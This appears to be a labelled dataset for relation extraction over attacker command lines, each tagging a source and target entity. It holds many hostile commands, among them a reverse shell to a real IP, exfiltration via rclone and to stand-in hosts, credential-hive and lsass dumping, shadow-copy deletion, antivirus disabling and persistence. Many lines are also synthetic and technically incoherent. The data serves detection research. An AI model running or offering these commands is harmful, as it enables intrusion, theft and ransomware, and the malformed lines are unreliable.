process-file-read(e1,e2)	<e1>notepad_29.exe</e1> <e2>C:\Users\admin\notes_29.txt</e2>
process-socket-receive(e1,e2)	wmic.exe <e1>nc</e1> -lvp 4444 -s <e2>https://evil.server/payload</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c <e2>C:ProgramDataAnyDesk.exe</e2> –install C:ProgramDataAnyDesk –start-with-win –silent
process-socket-receive(e1,e2)	wmic.exe <e1>socat</e1> TCP4-LISTEN:8080,fork <e2>http://attacker.com/c2</e2>
process-file-write(e1,e2)	torify <e1>nuclei</e1> -u mossad.gov.il -o <e2>mossad.gov.il_new</e2>
process-file-write(e1,e2)	cmd.exe /C <e1>net</e1> group /domain > <e2>C:\Windows\Temp\aWatKmSa.tmp</e2> 2>&1
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>ping</e2> -n 1 <REDACTED_DOMAIN_NAME>
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /c cd %appdata%\Microsoft\Network && <e1>powershell</e1> Expand-Archive python-3.10.4-embed-amd64.zip -DestinationPath <e2>%appdata%\Microsoft\Network</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>attrib</e2> +s +h C:\Users\Public\runme.bat
process-socket-receive(e1,e2)	rundll32.exe <e1>nc</e1> -lvp 4444 -s <e2>http://attacker.com/c2</e2>
process-process-inject(e1,e2)	<e1>powershell.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>taskmgr.exe</e2>
process-file-write(e1,e2)	<e1>cmd</e1> /C > <e2>C:\ProgramData\1.txt</e2> 2>&1 reg query HKEY_USERS\\<SID>\Network
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>chmod</e2> 777 C:\Windows\Temp\evil.dll
process-file-write(e1,e2)	"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d <e1>""reg.exe</e1> save hklm\system <e2>c:\ProgramData\system.save""</e2> /f"
process-file-exec(e1,e2)	"wmic /node:IP_Address process call create <e1>""cmd.exe</e1> /c start <e2>C:\Progradata\sc_https_x64.exe""</e2>"
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>dllinjector.exe</e2> -p explorer.exe -d payload.dll
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>ping</e1> <e2><hostname redacted></e2>
process-file-chmod(e1,e2)	wmic.exe <e1>chmod</e1> 777 <e2>C:\Users\Public\runme.bat</e2>
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>cool.exe</e2> [DC IP ADDRESS] [DOMAIN NAME] Administrator -c ""taskkill /f /im explorer.exe"""
process-file-chmod(e1,e2)	svchost.exe <e1>attrib</e1> +s +h <e2>C:\Windows\Temp\evil.dll</e2>
process-file-read(e1,e2)	<e1>reg_23.exe</e1> query <e2>HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion</e2>
process-file-read(e1,e2)	<e1>schtasks.exe</e1> /Create /F /XML %wintmp%\Wininet.xml /tn <e2>'\Microsoft\Windows\Maintenance\Wininet'</e2>
process-file-read(e1,e2)	<e1>ex.exe</e1> x -prootBRUCE -y C:\Windows\<REDACTED>\AppData\Local\Temp\istx64f.rar <e2>C:\Windows\<REDACTED>\AppData\Local\Temp\mstrx\<file></e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>nc</e2> -lvp 4444 -s https://evil.server/payload
process-file-read(e1,e2)	<e1>cmd.exe</e1> /c mofcomp.exe <e2>C:\Windows\SERVIC\~1\MSSQL$\~1\AppData\Local\Temp\xitmf</e2>
process-process-inject(e1,e2)	<e1>python.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>lsass.exe</e2>
process-file-read(e1,e2)	<e1>7z_19.exe</e1> x <e2>C:\Users\Public\archive_19.7z</e2> -so > nul
process-file-read(e1,e2)	<e1>wscript_88.exe</e1> readAll <e2>C:\inetpub\wwwroot\web_88.config</e2>
process-process-fork(e1,e2)	<e1>cmd_13.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_13.txt
process-socket-receive(e1,e2)	wmic.exe <e1>nc</e1> -lvp 4444 -s <e2>10.10.10.10:4444</e2>
process-file-exec(e1,e2)	<e1>C:\Windows\System32\rundll32.exe</e1> <e2>tamirlan.dll,EdHVntqdWt</e2>
process-file-chmod(e1,e2)	rundll32.exe <e1>chmod</e1> 777 <e2>/usr/local/bin/backdoor</e2>
process-file-write(e1,e2)	"reg.exe add hkcu\software\classes\ms-settings\shell\open\command /ve /d <e1>""reg.exe</e1> save hklm\sam <e2>c:\ProgramData\sam.save""</e2> /f"
process-file-read(e1,e2)	<e1>notepad_24.exe</e1> <e2>C:\Users\admin\notes_24.txt</e2>
process-file-unlink(e1,e2)	cmd.exe <e1>Remove-Item</e1> <e2>/var/tmp/hide.so</e2> -Force
process-socket-receive(e1,e2)	rundll32.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind 10.10.10.10:4444
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender""</e2> /v ""AllowFastServiceStartup"" /t REG_DWORD /d 0x0 /f"
process-process-fork(e1,e2)	<e1>%WINDIR%\system32\cmd.exe</e1> /C <e2>net</e2> usre REDACTED /dom
Other	<e1>cmd.exe</e1> /C powershell Get-MpComputerStatus > <e2>C:\Windows\Temp\KMzFGwGn.tmp</e2> 2>&1
process-file-write(e1,e2)	<e1>net</e1> localgroup 'Remote Desktop Users' /add <e2>DefaultAccount</e2>;
process-file-exec(e1,e2)	<e1>rundll32.exe</e1> -exec <e2>C:\Users\Public\runme.bat</e2>
process-file-exec(e1,e2)	<e1>schtasks.exe</e1> /Create /F /XML <e2>%wintmp%\Wininet.xml</e2> /tn '\Microsoft\Windows\Maintenance\Wininet'
Other	<e1>cmd.exe</e1> /c C:ProgramDataAnyDesk.exe –install <e2>C:ProgramDataAnyDesk</e2> –start-with-win –silent
process-process-unlink(e1,e2)	<e1>cmd.exe</e1> kill (Get-Process <e2>notepad.exe.Id)</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>taskkill</e2> /IM winlogon.exe /F
process-file-unlink(e1,e2)	<e1>vssadmin.exe</e1> <e2>Delete Shadows</e2> /all /quiet
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /Q /c <e2>dor</e2> 1> \\127.0.0.1\ADMIN$\____REDACTED 2>&1
process-process-unlink(e1,e2)	<e1>taskkill</e1> -f -im <e2>sqlwriter.exe</e2>
process-process-inject(e1,e2)	<e1>rundll32.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>lsass.exe</e2>
Other	cmd.exe /q /c upload <e1>c:\users\<user>\documents\<doc></e1> /home/kali/desktop/<doc> 1> <e2>\\127.0.0.1\admin$\<num>.<num></e2> 2>&1
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>del</e2> C:\ProgramData\updater.exe
process-file-write(e1,e2)	"<e1>reg</e1> add <e2>""HKLM\Software\Policies\Microsoft\Windows Defender""</e2> /v ""DisableAntiSpyware"" /t REG\_DWORD /d ""1"" /f"
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>veeamdeploymentsvc.exe</e2> /F
process-process-fork(e1,e2)	<e1>torify</e1> <e2>nuclei</e2> -l large_scope -o large_scope -s critical,high
process-file-read(e1,e2)	"<e1>reg</e1> query <e2>hkcu\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall</e2> /v ""DisplayName"" /s"
process-file-write(e1,e2)	C:\Windows\system32\cmd.ex /C <e1>7za.exe</e1> a -tzip -mx5 <e2>c:\programdata\lsass.zip</e2> c:\programdata\lsass.dmp
process-file-exec(e1,e2)	<e1>msiexec.exe</e1> /i <e2>Site24x7WindowsAgent.msi</e2> EDITA1=asdasd /qn
process-file-exec(e1,e2)	<e1>rundll32_99.exe</e1> <e2>shell32.dll,Control_RunDLL</e2> C:\Temp\config.ini
process-socket-send(e1,e2)	svchost.exe <e1>curl</e1> -X POST --data 'ping' <e2>10.10.10.10:4444</e2>
process-file-read(e1,e2)	"C:\Windows\system32\cmd.exe /C wmic /node:<REDACTED> process call create ""cmd /C > C:\ProgramData\1.txt 2>&1 <e1>reg</e1> query <e2>HKEY_USERS\<SID>\Network""</e2>"
process-process-fork(e1,e2)	<e1>python.exe</e1> /c start <e2>rundll32.exe</e2>
process-socket-receive(e1,e2)	<e1>wmic</e1> <e2>/node:REDACTED</e2> /user:DOMAIN\USER /password:REDACTED process call create cmd.exe /c copy \\REDACTED\c$\windows\temp\p.bat c:\windows\temp
process-file-write(e1,e2)	"<e1>C:\Windows\system32\reg.exe</e1> ADD <e2>""HKLM\SOFTWARE\Microsoft\Microsoft Antimalware\Exclusions\Paths""</e2> /f /t REG_DWORD /v ""C:\ProgramData\Microsoft\Oweboiqnb"" /d ""0"""
process-socket-send(e1,e2)	"cmd.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>https://evil.server/payload</e2> -Body 'cmd=whoami'"""
Other	<e1>C:\Windows\system32\cmd.exe</e1> /c cd %appdata%\Microsoft\Network && python.exe <e2>Packages.txt</e2>
process-file-exec(e1,e2)	psexec.exe -accepteula -d -s \\<INTERNAL_IP> <e1>rundll32.exe</e1> <e2>C:\windows\192145.dll</e2> ,StartW
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>chmod</e2> 777 /tmp/malware.sh
process-socket-send(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>nltest</e1> /dclist <e2><domainname redacted></e2>
process-socket-send(e1,e2)	"python.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>https://evil.server/payload</e2> -Body 'cmd=whoami'"""
process-process-fork(e1,e2)	"<e1>""C:\Windows\System32\schtasks.exe""</e1> /Create /SC MINUTE /TN ""Update service for Windows Service"" /TR <e2>PowerShell.exe</e2> -ExecutionPolicy bypass -windowstyle hidden -File C:\Users\Administrator\update.ps1"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>Remove-Item</e2> C:\ProgramData\updater.exe -Force
process-process-unlink(e1,e2)	<e1>python.exe</e1> Stop-Process -Name <e2>lsass.exe</e2> -Force
process-file-write(e1,e2)	<e1>nuclei</e1> -l co_nic_gov -o <e2>co_nic_gov_proxy_output</e2> -s critical -proxy socks5://localhost:1080
process-file-write(e1,e2)	<e1>c:\windows\system32\wevtutil.exe</e1> set-log <e2>microsoft-windows-taskscheduler/operational</e2> /enabled:false
process-file-write(e1,e2)	C:\Windows\system32\cmd.exe /C <e1>adfind.exe</e1> -subnets -f (objectCategory=subnet)> <e2>subnets.txt</e2>
process-file-write(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>powershell</e1> -c ""get-eventlog 'Security' | where {$_.Message -like '*<REDACTED>*' -AND 'Source Network Address'} | export-csv <e2>c:\windows\temp\events_<REDACTED>.txt""</e2>"
process-file-write(e1,e2)	"<e1>powershell_34.exe</e1> -Command ""Set-Content -Path <e2>C:\Windows\Temp\log_34.txt</e2> -Value 'infected'"""
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>C:\Windows\Temp\adf\anchorAsjuster_x64.exe</e2> --source=anchorDNS_x64.exe --target=anchor_x64.exe --domain=xyskencevli.com,sluaknhbsoe.com --period=2 --lasthope=2 -guid
process-process-inject(e1,e2)	<e1>powershell.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>explorer.exe</e2>
process-file-exec(e1,e2)	"<e1>python.exe</e1> -Command ""Start-Process <e2>C:\ProgramData\updater.exe""</e2>"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>socat</e2> TCP4-LISTEN:8080,fork https://evil.server/payload
process-file-exec(e1,e2)	cmd.exe /c <e1>rundll32.exe</e1> <e2>C:\ProgramData\n23.dll,AddProgram</e2>
process-process-fork(e1,e2)	<e1>adfind.exe</e1> -f (objectcategory=organizationalUnit) > <e2>ad_ous.txt</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>Remove-Item</e2> /var/tmp/hide.so -Force
process-socket-send(e1,e2)	<e1>nc</e1> -e /bin/bash <e2>104.200.67.3</e2> 1608 2> /dev/null
process-file-read(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /K copy <e2>ttsel.exe</e2> \\<IP>\c\windows\temp\
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>powershell</e2> Start-Process python.exe
process-file-write(e1,e2)	"net localgroup Administrators Support /add & <e1>net</e1> localgroup <e2>""Remote Desktop Users""</e2> Support /add"
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""Sophos AutoUpdate""</e2> call uninstall /nointeractive"
Other	C:\Windows\system32\cmd.exe /C for /f %%i in (C:\ProgramData\servers_live.txt) do dir <e1>\\%%i\C$</e1> >> <e2>C:\ProgramData\servers_live_dir.txt</e2>
process-file-read(e1,e2)	<e1>certutil_76.exe</e1> -encode <e2>input_76.txt</e2> C:\temp\encoded_76.txt
process-file-exec(e1,e2)	"<e1>cmd</e1> /c <e2>""C:\Users\Administrator\Music\start — копия.bat""</e2>"
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>net</e2> group /domain
process-file-chmod(e1,e2)	powershell.exe <e1>icacls</e1> <e2>C:\Windows\Temp\evil.dll</e2> /grant Everyone:F
process-socket-send(e1,e2)	cmd.exe /q /c <e1>reg</e1> add hkey_local_machine\system\currentcontrolset\control\lsa /v disablerestrictedadmin /t reg_dword /d 0 1> <e2>\\127.0.0.1\admin\$\__<timestamp>\.<num></e2> 2>&1
process-process-unlink(e1,e2)	<e1>net</e1> stop <e2>BackupExecRPCService</e2> /y
Other	C:\Windows\system32\cmd.exe /C for /f %i in <e1>(C:\ProgramData\hosts.txt)</e1> do ping -n 1 %i -v 4 | find /I TTL >> <e2>C:\ProgramData\hosts_live.txt</e2>
process-process-unlink(e1,e2)	<e1>C:\Windows\System32\taskkill.exe</e1> /IM <e2>sqlservr.exe</e2> /F
process-file-read(e1,e2)	<e1>powershell_31.exe</e1> Get-Content <e2>C:\Users\Public\secrets_31.txt</e2>
process-process-unlink(e1,e2)	svchost.exe <e1>taskkill</e1> /IM <e2>svchost.exe</e2> /F
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>attrib</e2> +s +h C:\ProgramData\updater.exe
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>chmod</e2> 777 /var/tmp/hide.so
process-socket-receive(e1,e2)	wmic.exe <e1>python3</e1> -m http.server 8080 --bind <e2>http://attacker.com/c2</e2>
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server""</e2> /t REG_DWORD /v ""TSEnabled"" /d 1 /f"
process-socket-send(e1,e2)	<e1>nltest</e1> <e2>/dclist:<DOMAINNAME>.local</e2>
process-process-fork(e1,e2)	<e1>python.exe</e1> /c start <e2>wmic.exe</e2>
process-file-write(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>AdFind.exe</e1> -f ""&(objectcategory=computer)"" operatingSystem -csv > <e2>1.csv</e2>"
process-file-read(e1,e2)	<e1>wscript_47.exe</e1> readAll <e2>C:\inetpub\wwwroot\web_47.config</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> /c start <e2>python.exe</e2>
process-file-write(e1,e2)	<e1>certutil_93.exe</e1> -encode input_93.txt <e2>C:\temp\encoded_93.txt</e2>
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>AdFind.exe</e2> -f ""&(objectcategory=computer)"" operatingSystem -csv > 1.csv"
process-file-exec(e1,e2)	<e1>rundll32_46.exe</e1> <e2>shell32.dll,Control_RunDLL</e2> C:\Temp\config.ini
process-file-chmod(e1,e2)	python.exe <e1>icacls</e1> <e2>C:\Users\Public\runme.bat</e2> /grant Everyone:F
process-socket-receive(e1,e2)	rundll32.exe <e1>python3</e1> -m <e2>http.server 8080</e2> --bind https://evil.server/payload
process-file-read(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>net</e1> group <e2>""domain Admins""</e2> /domainroute printwhoami"
process-file-unlink(e1,e2)	"<e1>REG</e1> DELETE <e2>""HKLM\Software\Microsoft\Windows\CurrentVersion\Run""</e2> /v ""SecurityHealth"" /f"
process-file-chmod(e1,e2)	powershell.exe <e1>icacls</e1> <e2>/usr/local/bin/backdoor</e2> /grant Everyone:F
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>taskkill</e2> /IM notepad.exe /F
process-file-chmod(e1,e2)	svchost.exe <e1>icacls</e1> <e2>C:\Users\Public\runme.bat</e2> /grant Everyone:F
process-file-write(e1,e2)	"<e1>PsExec.exe</e1> /accepteula <e2>@comps1.txt</e2> -u ""domain.local\Administrator"" -p ""REDACTED"" cmd /c COPY ""\\REDACTED\share$\ds.exe"" %WINDIR%\temp"
process-process-fork(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <backup server> --port 9401 --cmd <e2>""c:\windows\notepad.exe""</e2> --sql ""EXEC master..xp\_cmdshell 'net user sqlbackup Password!1221! /add'"""
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>python3</e2> -m http.server 8080 --bind https://evil.server/payload
process-socket-send(e1,e2)	"<e1>psexec.exe</e1> <e2>\\TARGET_HOST_IP</e2> -u DOMAIN\USER -p ""PASSWORD"" -s -d -h -r mstdc -accepteula -nobanner c:\windows\temp\p.bat"
process-process-fork(e1,e2)	<e1>svchost.exe</e1> runas /user:admin <e2>cmd.exe</e2>
process-file-read(e1,e2)	<e1>nltest</e1> <e2>/dclist:<hidden>.local</e2>
process-file-read(e1,e2)	<e1>wmic_90.exe</e1> process get commandline < <e2>C:\cmd\proc_90.txt</e2>
process-file-write(e1,e2)	"cmd.exe /C <e1>reg</e1> add ""HKLM\software\microsoft\windows nt\currentversion\winlogon"" /v UserInit /t reg_sz /d <e2>""c:\windows\system32\userinit.exe,c:\users\[REDACTED]\appdata\local\notepad\UpdateEdge.bat</e2>"
process-process-fork(e1,e2)	<e1>wmic.exe</e1> runas /user:admin <e2>wmic.exe</e2>
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>Remove-Item</e2> /usr/local/bin/backdoor -Force
process-process-fork(e1,e2)	<e1>%windir%\system32\cmd.exe</e1> /c start <e2>rundll32.exe</e2> mkl2n.dll,kXlNkCKgFC
process-file-write(e1,e2)	cmd.exe /c <e1>C:\ProgramData\AnyDesk.exe</e1> --install <e2>C:\ProgramData\AnyDesk</e2> --start-with-win --silent
process-process-unlink(e1,e2)	<e1>wmic.exe</e1> Stop-Process -Name <e2>winlogon.exe</e2> -Force
Other	<e1>ping</e1> -n 1 <REDACTED>shell <e2>wmic</e2> /node:<REDACTED> process get executablepath
process-socket-send(e1,e2)	<e1>tasklist</e1> /v /s <e2><REMOTE_IP></e2>
process-file-write(e1,e2)	"<e1>find.exe</e1> -f ""objectcategory=computer"" > <e2>ad_computers.txt</e2>"
process-file-read(e1,e2)	<e1>nuclei</e1> -l <e2>sept24.txt</e2> -o sept24_op.txt -s critical,high
process-file-exec(e1,e2)	"<e1>python.exe</e1> -Command ""Start-Process <e2>/tmp/malware.sh""</e2>"
process-file-exec(e1,e2)	"%WINDIR%\system32\cmd.exe /C <e1>.\rclone.exe</e1> copy <e2>""E:\REDACTED\domain""</e2> mega:REDACTED/domain -q --ignore-existing --REDACTED-confirm --multi-thread-streams 12 --transfers 12 --no-console"
process-process-fork(e1,e2)	"<e1>wmic</e1> /node:""[TARGET IP]"" /user:""[DOMAIN]\[USER]"" /password:""[PASSWORD]"" process call create <e2>""cmd.exe</e2> /c c:\windows\temp\p.bat"""
process-file-exec(e1,e2)	<e1>python.exe</e1> /c start <e2>C:\ProgramData\updater.exe</e2>
process-file-write(e1,e2)	<e1>powershell</e1> Get-ADComputer -Filter * -Properties Name,Operatingsystem, OperatingSystemVersion, OperatingSystemServicePack,IPv4Address >> <e2>log2.txt</e2>
process-file-write(e1,e2)	powershell.exe /c <e1>net</e1> user /add <e2>DefaultAccount</e2> P@ssw0rd123412;
process-process-fork(e1,e2)	"<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>AdFind.exe</e2> -f ""objectcategory=person"" sAMAccountName name displayName givenName department description title mail logonCount -csv > person.csv"
process-file-write(e1,e2)	"<e1>cmd</e1> /v /c whoami /upn > <e2>""%TEMP%\26906.txt""</e2> 2>&1"
process-file-unlink(e1,e2)	"start <e1>wmic</e1> product where <e2>name=""McAfee Endpoint Security Threat Prevention""</e2> call uninstall /nointeractive"
process-process-unlink(e1,e2)	<e1>schtasks</e1> /delete /tn <e2>Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance</e2> /f
process-file-read(e1,e2)	<e1>ftp_73.exe</e1> <e2>-s:script_73.txt</e2> C:\inetpub\wwwroot\ftp_73.log
process-file-write(e1,e2)	cmd_74.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_74.txt</e2>
process-file-exec(e1,e2)	<e1>bcdedit</e1> /set {default} <e2>safeboot</e2> network
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>del</e2> C:\Users\Public\runme.bat
process-process-inject(e1,e2)	<e1>svchost.exe</e1> Invoke-ReflectivePEInjection -PEPath <e2>winlogon.exe</e2>
process-file-write(e1,e2)	cmd.exe /Q /c <e1>dor</e1> 1> <e2>\\127.0.0.1\ADMIN$\____REDACTED</e2> 2>&1
process-file-read(e1,e2)	<e1>powershell_73.exe</e1> Get-Content <e2>C:\Users\Public\secrets_73.txt</e2>
process-file-exec(e1,e2)	C:\Windows\System32\cmd.exe /c start <e1>rundll32</e1> <e2>namr.dll</e2>,IternalJob
process-file-chmod(e1,e2)	svchost.exe <e1>chmod</e1> 777 <e2>/tmp/malware.sh</e2>
process-process-unlink(e1,e2)	"<e1>net</e1> stop <e2>""Symantec System Recovery""</e2> /y"
process-file-chmod(e1,e2)	cmd.exe <e1>icacls</e1> <e2>/usr/local/bin/backdoor</e2> /grant Everyone:F
process-process-fork(e1,e2)	<e1>cmd_61.exe</e1> /c <e2>echo</e2> %USERNAME% >> C:\output\users_61.txt
process-process-unlink(e1,e2)	"<e1>C:\Windows\System32\net.exe</e1> stop <e2>""veeamcatalogsvc""</e2> /y"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /c bitsadmin /transfer update_service \\REDACTED\share$\ds.exe %APPDATA%\ds.exe & <e2>%APPDATA%\ds.exe</e2> -pass REDACTED
process-file-exec(e1,e2)	<e1>schtasks</e1> /create /I 1 /TR <e2>C:\Users\REDACTED\AppData\Local\Notepad\UpdateEG.bat</e2> /TN UpdateEdge /SC ONIDLE
process-file-write(e1,e2)	cmd_3.exe /c <e1>echo</e1> %USERNAME% >> <e2>C:\output\users_3.txt</e2>
Other	<e1>C:\Windows\System32\cmd.exe</e1> /c rundll32.exe <e2>C:\ProgramData\x86.dll</e2>, StartA
process-process-fork(e1,e2)	"<e1>wmic</e1> /node:""<IP ADDRESS>"" /user:""<DOMAIN>\Administrator"" /password:""<PASSWORD>"" process call create <e2>""cmd.exe</e2> /c c:\windows\temp\ttsel.exe"""
process-file-exec(e1,e2)	"schtasks /create /tn K0adic /tr <e1>""C:\Windows\system32\mshta.exe</e1> <e2>C:\ProgramData\SZWXNUHHDP.hta""</e2> /sc onlogon /ru System /f"
process-process-inject(e1,e2)	<e1>svchost.exe</e1> Set-ProcessInjection -Target <e2>lsass.exe</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /C <e2>rundll32</e2> C:\Windows\system32\SQL.dll, StartW
process-file-write(e1,e2)	"<e1>python_24.exe</e1> -c <e2>""open('C:\\Users\\admin\\payload_24.exe',</e2> 'wb').write(b'\x90\x90\x90')"""
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>dllinjector.exe</e2> -p notepad.exe -d payload.dll
process-file-write(e1,e2)	"<e1>REG</e1> ADD <e2>""HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration""</e2> /v ""NotificationSuppress"" /t REG_DWORD /d 0x1 /f"
process-socket-receive(e1,e2)	rundll32.exe <e1>socat</e1> <e2>TCP4-LISTEN:8080,fork</e2> https://evil.server/payload
process-file-write(e1,e2)	torify <e1>nuclei</e1> -l large_scope -o <e2>large_scope</e2> -as
process-socket-send(e1,e2)	"rundll32.exe <e1>powershell</e1> -c ""Invoke-RestMethod -Uri <e2>http://attacker.com/c2</e2> -Body 'cmd=whoami'"""
process-socket-send(e1,e2)	python.exe <e1>curl</e1> -X POST --data 'ping' <e2>http://attacker.com/c2</e2>
process-file-unlink(e1,e2)	powershell.exe <e1>rm</e1> <e2>/usr/local/bin/backdoor</e2>
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> <e2>secretsdump.exe</e2> -hashes :[HASH REDACTED] [USERNAME REDACTED]@[IP ADDRESS REDACTED]
process-file-unlink(e1,e2)	cmd.exe <e1>del</e1> <e2>/usr/local/bin/backdoor</e2>
process-process-unlink(e1,e2)	<e1>taskkill</e1> -f -im <e2>sqlservr.exe</e2>
Other	C:\Windows\system32\cmd.exe /C for /f %i in (<e1>C:\ProgramData\servers_live.txt</e1>) do net view \\%i /all >> <e2>C:\ProgramData\servers_live_netview.txt</e2>
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>Remove-Item</e2> /var/tmp/hide.so -Force
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>attrib</e2> +s +h C:\Windows\Temp\evil.dll
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>nc</e2> -lvp 4444 -s http://attacker.com/c2
process-socket-send(e1,e2)	python.exe <e1>curl</e1> -X POST --data 'ping' <e2>192.168.1.100:8080</e2>
process-process-fork(e1,e2)	<e1>wmic.exe</e1> <e2>attrib</e2> +s +h /tmp/malware.sh
process-socket-send(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <e2><backup server></e2> --port 9401 --cmd ""c:\windows\notepad.exe"" --sql ""RECONFIGURE"""
process-process-fork(e1,e2)	<e1>python.exe</e1> <e2>rm</e2> C:\ProgramData\updater.exe
process-file-write(e1,e2)	cmd.exe /c <e1>echo</e1> xgxfpw > <e2>\\.\pipe\xgxfpw</e2>
process-process-unlink(e1,e2)	<e1>python.exe</e1> kill (Get-Process <e2>taskmgr.exe.Id)</e2>
process-socket-send(e1,e2)	cmd.exe <e1>curl</e1> -X POST --data 'ping' <e2>10.10.10.10:4444</e2>
process-process-fork(e1,e2)	<e1>svchost.exe</e1> <e2>python3</e2> -m http.server 8080 --bind https://evil.server/payload
process-process-fork(e1,e2)	"<e1>VeeamHax.exe</e1> --verbose --target <backup server> --port 9401 --cmd <e2>""c:\windows\notepad.exe""</e2> --sql ""EXEC master..xp\_cmdshell 'net localgroup administrators sqlbackup /add'"""
process-process-fork(e1,e2)	<e1>cmd.exe</e1> <e2>nc</e2> -lvp 4444 -s http://attacker.com/c2
process-process-fork(e1,e2)	<e1>C:\Windows\system32\cmd.exe</e1> /c <e2>attrib</e2> +S +H %appdata%\Microsoft\Network
process-process-fork(e1,e2)	<e1>rundll32.exe</e1> <e2>python3</e2> -m http.server 8080 --bind 192.168.1.100:8080
process-process-fork(e1,e2)	<e1>powershell.exe</e1> <e2>curl</e2> -X POST --data 'ping' 10.10.10.10:4444
process-file-exec(e1,e2)	"C:\Windows\system32\cmd.exe /C <e1>wmic</e1> /node:""ENDPOINT"" process call create <e2>C:\test.exe</e2>"
process-process-fork(e1,e2)	<e1>cmd.exe</e1> /C <e2>PsExec64.exe</e2> -accepteula @pc.txt -c -f -d -h 1.bat
